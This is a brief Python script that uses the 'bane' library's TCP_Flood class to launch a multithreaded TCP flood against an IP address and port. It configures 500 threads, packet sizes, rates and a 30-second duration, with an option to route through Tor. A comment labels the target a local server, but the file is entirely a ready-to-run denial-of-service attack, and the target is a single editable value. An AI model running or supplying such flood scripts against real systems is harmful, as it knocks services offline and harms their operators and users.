from bane.ddos import TCP_Flood

def main():
    try:
        # Create an instance of TCP_Flood
        tcp_flood = TCP_Flood(
            u="192.168.1.147",  # Target IP address (your local server)
            p=8081,  # Target port
            threads_daemon=True,  # Set threads as daemons
            min_size=10,  # Minimum size of TCP packets
            max_size=50,  # Maximum size of TCP packets
            threads=500,  # Number of threads
            timeout=5,  # Timeout for socket connections
            round_min=1000,  # Minimum packets sent per connection
            round_max=10000,  # Maximum packets sent per connection
            interval=0.001,  # Interval between sending packets
            duration=30,  # Duration of the attack in seconds
            logs=True,  # Enable logging
            tor=False,  # Do not use the Tor network
            ssl_on=False  # SSL/TLS not enabled
        )

        print("[*] Starting TCP flood attack...")
        tcp_flood.attack()  # Launch the TCP flood attack

        import time
        time.sleep(30)  # Let it run for the specified duration

        # Stop the attack manually if needed
        print("[*] Stopping TCP flood attack...")
        tcp_flood.stop = True  # Graceful termination of the attack

        print("[*] TCP flood attack stopped.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    main()